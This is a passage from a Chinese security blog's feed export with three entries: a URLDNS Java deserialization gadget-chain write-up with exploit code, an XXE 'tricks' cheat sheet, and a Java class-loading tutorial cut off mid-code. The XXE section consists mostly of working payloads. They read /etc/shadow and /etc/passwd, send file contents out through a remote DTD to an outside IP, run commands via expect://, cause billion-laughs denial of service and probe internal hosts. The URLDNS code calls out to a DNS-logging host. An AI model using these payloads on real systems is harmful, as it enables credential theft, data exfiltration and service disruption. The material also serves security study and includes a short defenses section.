keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//...略</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                    K key <span class="token operator">=</span> <span class="token punctuation">(</span>K<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                    V value <span class="token operator">=</span> <span class="token punctuation">(</span>V<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> h<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token punctuation">(</span>h <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此整条链子：</p><pre class="line-numbers language-java"><code class="language-java">HashMap<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>HashMap<span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URL<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URL<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span>URLStreamHandler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URLStreamHandler<span class="token punctuation">.</span><span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="错误的exp"><a href="#错误的exp" class="headerlink" title="错误的exp"></a>错误的exp</h5><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UrlDns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://?????.ceye.io"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        serialize(hashmap);</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地测试执行反序列化会发现并没有触发DNS解析。</p><p>这是因为Hashmap的put方法也会执行URL的hashCode()</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意到如果hashCode不等于初始化的-1时则直接return hashCode，如果用这个序列化的字节流反序列化肯定不会进行DNS解析。因此，我们需要修改hashCode的值为-1。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashCode <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>        hashCode <span class="token operator">=</span> handler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h5><p>通过反射修改属性即可，注意hashCode为私有属性。需要通过setAccessible设置作用域。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UrlDns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URL url<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://nqhaouynesbyaf4nivnxzrpwangh46.burpcollaborator.net"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field hashcode<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        serialize(hashmap);</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><p>1.<a href="https://blog.csdn.net/qq_47886905/article/details/123531299">https://blog.csdn.net/qq_47886905/article/details/123531299</a></p><p>2.<a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=fc78460cf16000301f7b3b1c07529ee0">https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=fc78460cf16000301f7b3b1c07529ee0</a></p><p>3.<a href="https://www.cnblogs.com/starrys/p/15564335.html">https://www.cnblogs.com/starrys/p/15564335.html</a></p><p>4.<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trick总结——XXE</title>
      <link href="/2021/11/25/trick-xxe/"/>
      <url>/2021/11/25/trick-xxe/</url>
      
        <content type="html"><![CDATA[<h4 id="有回显，读文件："><a href="#有回显，读文件：" class="headerlink" title="有回显，读文件："></a>有回显，读文件：</h4><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY ></span> &lt;!ENTITY xxe SYSTEM "file:///etc/shadow" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无回显，外带："><a href="#无回显，外带：" class="headerlink" title="无回显，外带："></a>无回显，外带：</h4><h5 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h5><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://49.232.???.???/?p=%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有些时候读不出来，需要编码。</p><pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://49.232.???.???/?p=%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://139.9.???.???/exp/squirt1e.dtd"></span>%remote;%int;%send;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h4><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>     <span class="token doctype">&lt;!DOCTYPE lolz [     &lt;!ENTITY lol "lol"></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>     ]>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>php需要安装expect拓展。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "expect://whoami" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h4><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> <span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY ></span>&lt;!ENTITY xxe SYSTEM "http://192.168.1.1:80" >]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h4><p>1.使用开发语言提供的禁用外部实体的方法</p><pre><code>PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p>2.过滤和验证用户提交的<code>XML数据</code></p><p>3.过滤关键词<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY SYSTEM</code>、<code>PUBLIC</code></p><p>4.不允许XML中含有任何自己声明的<code>DTD</code></p><p>5.有效的措施：配置<code>XML parser</code>只能使用<code>静态DTD</code>，禁止外来引入</p><p>对于<code>Java</code>来说，直接设置相应的属性值为<code>false</code>即可</p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>1.<a href="https://www.cnblogs.com/icml8/p/16289190.html">https://www.cnblogs.com/icml8/p/16289190.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Trick </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计基础—类加载</title>
      <link href="/2021/11/20/java-shen-ji-ji-chu-lei-jia-zai/"/>
      <url>/2021/11/20/java-shen-ji-ji-chu-lei-jia-zai/</url>
      
        <content type="html"><![CDATA[<p>运行Java时，不会一次性的把class文件加载进内存，而是通过类加载机制进行动态加载，从而转换成java.lang.Class类的一个实例。</p><p>JAVA四种修饰符的访问权限的，<a href="https://blog.csdn.net/kepengs/article/details/107512618?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-107512618-blog-107726158.pc_relevant_multi_platform_whitelistv1&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-107512618-blog-107726158.pc_relevant_multi_platform_whitelistv1&utm_relevant_index=1">图出自鹏鹏哥哥的小红帽</a></p><p><img src="https://img-blog.csdnimg.cn/20200722142142337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tlcGVuZ3M=,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h4><p>Java提供了ClassLoader类实现类加载。</p><h5 id="loadClass-String-name-方法"><a href="#loadClass-String-name-方法" class="headerlink" title="loadClass(String name)方法"></a>loadClass(String name)方法</h5><p>加载名称为name的类，返回的结果是java.lang.Class类的实例。</p><p>通过阅读源码可知，loadClass方法的运行过程为：</p><ol><li>调用findLoadedClass检查类是否已经被加载。</li><li>如果未被加载，则使用加载器的父类加载器进行加载。（递归逐级向上检查父类加载器能否加载）</li><li>如果父类加载器无法对该类进行加载时，则会调用自身的findClass方法，因此可以重写findClass方法来完成一些类加载的特殊要求。</li></ol><h5 id="defineClass-String-name-byte-b-int-off-int-len"><a href="#defineClass-String-name-byte-b-int-off-int-len" class="headerlink" title="defineClass(String name,byte[] b,int off,int len)"></a>defineClass(String name,byte[] b,int off,int len)</h5><p>将字节数组中的内容转换成Java类，返回结果是java.lang.Class类的实例，该方法声明为final，无法被重写。</p><p>因此，重写findClass方法就可以通过调用defineClass来实现自定义加载类。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">findClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">return</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="getParent-方法"><a href="#getParent-方法" class="headerlink" title="getParent()方法"></a>getParent()方法</h5><p>返回当前类加载器的父类加载器。</p><h5 id="resolveClass-Class-lt-gt-方法"><a href="#resolveClass-Class-lt-gt-方法" class="headerlink" title="resolveClass(Class&lt;?&gt;)方法"></a>resolveClass(Class&lt;?&gt;)方法</h5><p>链接指定的Java类。</p><h4 id="URLClassLoader类"><a href="#URLClassLoader类" class="headerlink" title="URLClassLoader类"></a>URLClassLoader类</h4><p>URLCIassLoader类是ClassLoader的一个实现，拥有从远程服务器上加载类的能力。通过URLCIassLoader可以实现对一些WebShell的远程加载。</p><p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况:</p><ol><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ol><p>以下为测试代码，通过Hello类远程加载Hello1.class。注意这里是包结构，因此Hello1这个类编译需要改名为com.Hello1.class，不然会加载失败。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>Hello<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token 